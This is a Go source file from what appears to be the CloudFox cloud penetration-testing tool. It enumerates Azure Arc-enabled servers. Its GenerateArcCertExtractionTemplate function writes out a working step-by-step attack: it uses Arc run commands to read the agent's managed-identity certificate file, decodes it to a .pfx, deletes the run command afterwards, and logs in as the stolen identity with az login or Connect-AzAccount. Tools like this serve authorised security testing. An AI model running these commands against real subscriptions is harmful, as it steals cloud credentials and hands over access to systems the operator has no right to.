package azure

import (
	"context"
	"fmt"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/hybridcompute/armhybridcompute/v2"
	"github.com/BishopFox/cloudfox/globals"
)

// ==================== ARC STRUCTURES ====================

// ArcMachine represents an Azure Arc-enabled server
type ArcMachine struct {
	Name              string
	ID                string
	Location          string
	ResourceGroup     string
	SubscriptionID    string
	OSName            string // "windows" or "linux"
	OSVersion         string
	Status            string
	ProvisioningState string
	VMId              string
	IdentityType      string
	PrincipalID       string
	TenantID          string
	AgentVersion      string
	LastStatusChange  string
	Hostname          string // FQDN (MachineFqdn/DNSFqdn) or computer name if FQDN unavailable
	PrivateIP         string // Private IP address from DetectedProperties
	EntraIDAuth       string // "Enabled" if Azure AD login extensions are installed, "Disabled" otherwise
}

// ==================== ARC HELPERS ====================

// GetArcMachines retrieves all Arc-enabled machines in a subscription
func GetArcMachines(session *SafeSession, subscriptionID string, resourceGroups []string) ([]ArcMachine, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return nil, err
	}
	cred := &StaticTokenCredential{Token: token}
	ctx := context.Background()

	client, err := armhybridcompute.NewMachinesClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}

	var results []ArcMachine

	// If specific resource groups provided, enumerate those
	if len(resourceGroups) > 0 {
		for _, rgName := range resourceGroups {
			pager := client.NewListByResourceGroupPager(rgName, nil)
			for pager.More() {
				page, err := pager.NextPage(ctx)
				if err != nil {
					continue
				}
				for _, machine := range page.Value {
					results = append(results, convertArcMachine(machine, rgName, subscriptionID))
				}
			}
		}
	} else {
		// Otherwise, enumerate all Arc machines in subscription
		pager := client.NewListBySubscriptionPager(nil)
		for pager.More() {
			page, err := pager.NextPage(ctx)
			if err != nil {
				return results, err
			}
			for _, machine := range page.Value {
				rgName := GetResourceGroupFromID(SafeStringPtr(machine.ID))
				results = append(results, convertArcMachine(machine, rgName, subscriptionID))
			}
		}
	}

	return results, nil
}

// convertArcMachine converts SDK Arc machine to our struct
func convertArcMachine(machine *armhybridcompute.Machine, resourceGroup, subscriptionID string) ArcMachine {
	result := ArcMachine{
		Name:           SafeStringPtr(machine.Name),
		ID:             SafeStringPtr(machine.ID),
		Location:       SafeStringPtr(machine.Location),
		ResourceGroup:  resourceGroup,
		SubscriptionID: subscriptionID,
		Hostname:       "N/A",
		PrivateIP:      "N/A",
	}

	if machine.Properties != nil {
		result.OSName = SafeStringPtr(machine.Properties.OSName)
		result.OSVersion = SafeStringPtr(machine.Properties.OSVersion)
		// Status is an enum type, need to convert to string
		if machine.Properties.Status != nil {
			result.Status = string(*machine.Properties.Status)
		}
		result.ProvisioningState = SafeStringPtr(machine.Properties.ProvisioningState)
		result.VMId = SafeStringPtr(machine.Properties.VMID)
		result.AgentVersion = SafeStringPtr(machine.Properties.AgentVersion)

		if machine.Properties.LastStatusChange != nil {
			result.LastStatusChange = machine.Properties.LastStatusChange.String()
		}

		// Extract hostname - prioritize FQDN to differentiate from Machine Name
		// Prefer MachineFqdn or DNSFqdn over simple ComputerName
		if machine.Properties.MachineFqdn != nil && *machine.Properties.MachineFqdn != "" {
			result.Hostname = *machine.Properties.MachineFqdn
		} else if machine.Properties.DNSFqdn != nil && *machine.Properties.DNSFqdn != "" {
			result.Hostname = *machine.Properties.DNSFqdn
		} else if machine.Properties.OSProfile != nil && machine.Properties.OSProfile.ComputerName != nil {
			result.Hostname = *machine.Properties.OSProfile.ComputerName
		}

		// Try to extract IP address from DetectedProperties
		// Azure Arc agents report IP addresses in detected properties
		if machine.Properties.DetectedProperties != nil {
			// Common property names used by Arc agents
			for _, key := range []string{"PrivateIPAddress", "privateIPAddress", "ipAddress", "IPAddress"} {
				if val, ok := machine.Properties.DetectedProperties[key]; ok && val != nil && *val != "" {
					result.PrivateIP = *val
					break
				}
			}
		}
	}

	// Extract managed identity information
	if machine.Identity != nil {
		if machine.Identity.Type != nil {
			result.IdentityType = string(*machine.Identity.Type)
		}
		result.PrincipalID = SafeStringPtr(machine.Identity.PrincipalID)
		result.TenantID = SafeStringPtr(machine.Identity.TenantID)
	}

	// Check for EntraID Centralized Auth (Azure AD login extensions)
	result.EntraIDAuth = "Disabled"
	if machine.Properties != nil && machine.Properties.Extensions != nil {
		for _, ext := range machine.Properties.Extensions {
			if ext != nil && ext.Name != nil {
				// Check for Azure AD login extensions (similar to VMs)
				extName := *ext.Name
				if extName == "AADSSHLoginForLinux" || extName == "AADLoginForWindows" {
					result.EntraIDAuth = "Enabled"
					break
				}
			}
			// Also check extension type if name doesn't match
			if ext != nil && ext.Type != nil {
				extType := *ext.Type
				if extType == "AADSSHLoginForLinux" || extType == "AADLoginForWindows" {
					result.EntraIDAuth = "Enabled"
					break
				}
			}
		}
	}

	return result
}

// GenerateArcCertExtractionTemplate creates a template for extracting managed identity certificates from Arc machines
func GenerateArcCertExtractionTemplate(machine ArcMachine) string {
	template := fmt.Sprintf("# Arc Machine Managed Identity Certificate Extraction Template\n")
	template += fmt.Sprintf("# Machine: %s\n", machine.Name)
	template += fmt.Sprintf("# Resource Group: %s\n", machine.ResourceGroup)
	template += fmt.Sprintf("# Subscription: %s\n", machine.SubscriptionID)
	template += fmt.Sprintf("# OS: %s (%s)\n\n", machine.OSName, machine.OSVersion)

	if machine.IdentityType == "" || machine.IdentityType == "None" {
		template += "# WARNING: No managed identity attached to this Arc machine\n"
		template += "# Cannot extract managed identity certificate\n\n"
		return template
	}

	template += fmt.Sprintf("# Identity Type: %s\n", machine.IdentityType)
	template += fmt.Sprintf("# Principal ID: %s\n", machine.PrincipalID)
	template += fmt.Sprintf("# Tenant ID: %s\n\n", machine.TenantID)

	// Determine OS-specific command
	var scriptContent string
	if machine.OSName == "windows" {
		scriptContent = "gc C:\\\\ProgramData\\\\AzureConnectedMachineAgent\\\\Certs\\\\myCert.cer"
	} else {
		scriptContent = "cat /var/opt/azcmagent/certs/myCert"
	}

	template += "## Step 1: Create Run Command\n\n"
	template += "```bash\n"
	template += "# Set variables\n"
	template += fmt.Sprintf("SUBSCRIPTION_ID=\"%s\"\n", machine.SubscriptionID)
	template += fmt.Sprintf("RESOURCE_GROUP=\"%s\"\n", machine.ResourceGroup)
	template += fmt.Sprintf("MACHINE_NAME=\"%s\"\n", machine.Name)
	template += "COMMAND_NAME=$(uuidgen | tr -d '-' | cut -c1-15)\n"
	template += "ACCESS_TOKEN=$(az account get-access-token --query accessToken -o tsv)\n\n"

	template += "# Create the run command\n"
	template += fmt.Sprintf("curl -X PUT \\\n")
	template += "  \"https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.HybridCompute/machines/${MACHINE_NAME}/runCommands/${COMMAND_NAME}?api-version=2023-10-03-preview\" \\\n"
	template += "  -H \"Authorization: Bearer ${ACCESS_TOKEN}\" \\\n"
	template += "  -H \"Content-Type: application/json\" \\\n"
	template += "  -d '{\n"
	template += fmt.Sprintf("    \"location\": \"%s\",\n", machine.Location)
	template += "    \"properties\": {\n"
	template += "      \"source\": {\n"
	template += fmt.Sprintf("        \"script\": \"%s\"\n", scriptContent)
	template += "      },\n"
	template += "      \"parameters\": []\n"
	template += "    }\n"
	template += "  }'\n"
	template += "```\n\n"

	template += "## Step 2: Wait for Command Execution\n\n"
	template += "```bash\n"
	template += "# Wait 10-15 seconds for command to execute\n"
	template += "sleep 15\n"
	template += "```\n\n"

	template += "## Step 3: Get Command Results\n\n"
	template += "```bash\n"
	template += "# Poll for command results\n"
	template += "while true; do\n"
	template += "  RESULT=$(curl -s \"https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.HybridCompute/machines/${MACHINE_NAME}/runCommands/${COMMAND_NAME}?api-version=2023-10-03-preview\" \\\n"
	template += "    -H \"Authorization: Bearer ${ACCESS_TOKEN}\")\n\n"
	template += "  STATE=$(echo \"$RESULT\" | jq -r '.properties.provisioningState')\n"
	template += "  echo \"Command State: $STATE\"\n\n"
	template += "  if [ \"$STATE\" == \"Succeeded\" ]; then\n"
	template += "    # Extract certificate (base64 encoded)\n"
	template += "    CERT_B64=$(echo \"$RESULT\" | jq -r '.properties.instanceView.output')\n"
	template += fmt.Sprintf("    echo \"$CERT_B64\" | base64 -d > %s.pfx\n", machine.PrincipalID)
	template += fmt.Sprintf("    echo \"Certificate saved to %s.pfx\"\n", machine.PrincipalID)
	template += "    break\n"
	template += "  elif [ \"$STATE\" == \"Failed\" ]; then\n"
	template += "    echo \"Command execution failed\"\n"
	template += "    break\n"
	template += "  fi\n\n"
	template += "  sleep 5\n"
	template += "done\n"
	template += "```\n\n"

	template += "## Step 4: Delete Run Command (Cleanup)\n\n"
	template += "```bash\n"
	template += "curl -X DELETE \\\n"
	template += "  \"https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.HybridCompute/machines/${MACHINE_NAME}/runCommands/${COMMAND_NAME}?api-version=2023-10-03-preview\" \\\n"
	template += "  -H \"Authorization: Bearer ${ACCESS_TOKEN}\"\n"
	template += "```\n\n"

	template += "## Step 5: Extract Certificate Information and Authenticate\n\n"
	template += "```bash\n"
	template += "# Extract certificate thumbprint and application ID\n"
	template += fmt.Sprintf("THUMBPRINT=$(openssl pkcs12 -in %s.pfx -nodes -passin pass: | openssl x509 -noout -fingerprint | cut -d'=' -f2 | tr -d ':')\n", machine.PrincipalID)
	template += fmt.Sprintf("APP_ID=$(openssl pkcs12 -in %s.pfx -nodes -passin pass: | openssl x509 -noout -subject | grep -oP 'CN=\\K[^,]+')\n\n", machine.PrincipalID)
	template += "# Authenticate using the certificate (requires importing to cert store)\n"
	template += fmt.Sprintf("# az login --service-principal --username ${APP_ID} --tenant %s --certificate %s.pfx\n", machine.TenantID, machine.PrincipalID)
	template += "```\n\n"

	template += "## Alternative: Using Azure CLI\n\n"
	template += "```bash\n"
	template += fmt.Sprintf("# Set subscription context\n")
	template += fmt.Sprintf("az account set --subscription %s\n\n", machine.SubscriptionID)
	template += "# Azure CLI doesn't have direct support for Arc run commands\n"
	template += "# Use the REST API approach above or the Azure portal\n"
	template += "```\n\n"

	template += "## PowerShell Alternative (Windows)\n\n"
	template += "```powershell\n"
	template += "# After extracting the certificate, create an authentication script:\n"
	template += fmt.Sprintf("$thumbprint = (Get-PfxCertificate '.\\%s.pfx').Thumbprint\n", machine.PrincipalID)
	template += fmt.Sprintf("$tenantID = '%s'\n", machine.TenantID)
	template += "$appId = (Get-PfxCertificate '.\\\" + $principalId + \".pfx').Subject.Split('=')[1]\n\n"
	template += "# Import certificate (requires local admin)\n"
	template += fmt.Sprintf("Import-PfxCertificate -FilePath '.\\%s.pfx' -CertStoreLocation Cert:\\LocalMachine\\My\n\n", machine.PrincipalID)
	template += "# Authenticate as the managed identity\n"
	template += "Connect-AzAccount -ServicePrincipal -Tenant $tenantID -CertificateThumbprint $thumbprint -ApplicationId $appId\n"
	template += "```\n\n"

	return template
}
